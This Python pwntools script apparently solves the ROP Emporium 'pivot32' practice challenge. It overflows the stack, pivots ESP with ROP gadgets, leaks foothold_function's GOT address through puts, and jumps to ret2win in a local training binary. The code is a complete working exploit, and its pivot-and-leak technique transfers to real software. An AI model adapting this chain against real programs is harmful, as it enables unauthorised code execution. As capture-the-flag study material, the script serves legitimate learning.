#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

''' Let's get the ret2win offset...
$ readelf -s libpivot32.so | grep foothold_function 
     9: 00000770    43 FUNC    GLOBAL DEFAULT   12 foothold_function
$ readelf -s libpivot32.so | grep ret2win           
    17: 00000967    46 FUNC    GLOBAL DEFAULT   12 ret2win
$ python -c 'print hex(0x00000967 - 0x00000770)'
'0x1f7' <-- Great! (can also be done through gdb...)
'''
ret2win_offset   = 0x1f7
main             = 0x0804873b  # objdump -t pivot32 | grep main
puts_plt         = 0x080485d0  # objdump -D pivot32 | grep puts
foothold_plt     = 0x080485f0  # objdump -D pivot32 | grep foothold_function
foothold_got_plt = 0x0804a024  # objdump -R pivot32 | grep foothold_function 

def move_esp(pivot):
    """moves stack pointer to pivot address"""
    chain =  "A"*44
    chain += p32(0x80488c0)  # pop eax; ret
    chain += p32(pivot)
    chain += p32(0x80488c2)  # xchg esp,eax; ret
    return chain

def leak_foothold():
    """ foothold_function() isn't called during normal program flow,
        so we'll have to call it first to populate it's .got.plt entry."""
    global foothold_got_plt, foothold_plt, puts_plt, main
    chain =  p32(foothold_plt)
    chain += p32(puts_plt)
    chain += p32(main)
    chain += p32(foothold_got_plt)
    return chain

def exploit():
    p = process('./pivot32')
    pivot_addr = int(p.recv().splitlines()[4].split()[11],16)

    p.sendline(leak_foothold())
    p.sendlineafter('> ',move_esp(pivot_addr))

    p.recvuntil('libpivot.so')
    data = p.recv()
    leak = u32(data[:4])
    log.info("foothold@GOT:  0x%x" % leak)
    new_pivot = int(data.splitlines()[-3].split()[-1],16)

    p.sendline(p32(leak+ret2win_offset))
    p.sendline(move_esp(new_pivot))
    print p.recv()

if __name__ == '__main__':
    exploit()
#_EOF